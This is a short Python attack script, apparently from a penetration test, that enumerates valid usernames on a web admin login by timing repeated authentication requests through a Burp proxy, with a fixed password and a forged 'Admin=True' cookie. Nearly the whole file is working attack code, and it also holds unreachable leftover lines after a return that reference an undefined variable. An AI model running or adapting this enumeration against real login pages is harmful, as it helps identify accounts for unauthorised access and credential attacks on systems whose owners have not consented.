#!/usr/bin/env python3

# import logging
import re
import requests


# logging.basicConfig(
#     # filename='example.log',
#     level=logging.INFO,
#     format='(%(threadName)-10s)-%(levelname)s: %(message)s',
# )



def print_error(msg):
	print("\033[1m\033[31m[-]\033[0m {0}".format(msg))


def print_status(msg):
    print("\033[1m\033[34m[*]\033[0m {0}".format(msg))


def print_good(msg):
    print("\033[1m\033[32m[+]\033[0m {0}".format(msg))


def print_warn(msg):
    print("\033[1m\033[33m[!]\033[0m {0}".format(msg))



def test_username(username):
    ''' Take a username as argument and return the response time to be compared.'''

    burp = {
        'http': 'http://localhost:8080/',
        'https': 'http://localhost:8080/',
    }
    s = requests.Session()
    s.proxies = burp
    site = 'https://www.client.com/'
    userAgent = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3569.0 Safari/537.36 autochrome/grey'

    # Get StateContext
    urlState = site + 'admin/login.aspx'
    headers = {
        'User-Agent': userAgent
    }
    reply = s.post(urlState, data={}, verify=False, headers=headers)
    stateContext = re.compile('<StateContext>([^<]*)</StateContext>').search(reply.text).group(1)

    # Test authentication
    urlAuth = site + 'p/u/doAuthentication.do'
    headers = {
        'User-Agent': userAgent,
        'Accept': 'application/xml, text/xml, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3569.0 Safari/537.36 autochrome/grey',
        'Referer': 'https://www.client.com/admin/',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cookie': 'Admin=True',
    }
    dataAuth = {
        'login': username,
        'passwd': 'Pa$$w0rd',
        'savecredentials': 'false',
        'StateContext': stateContext
    }
    reply = s.post(urlAuth, data=dataAuth, verify=False, headers=headers)
    return reply.elapsed.total_seconds()

    print(res)
    if re.search('An account registered to this email address already exists.', res):
        print('{} is an already registered account.'.format(username))
    else:
        print('{} does not exist.'.format(username))
    return 8

def main():
    nbTests = 100
    for user in ['testsecu', 'testsecur', 'testsecuri']:
        t = 0
        for i in range(nbTests):
            t += test_username(user)
        print('{} tests of "{}" took {} seconds in average.'.format(nbTests, user, t/nbTests))

if __name__ == '__main__':
        main()
    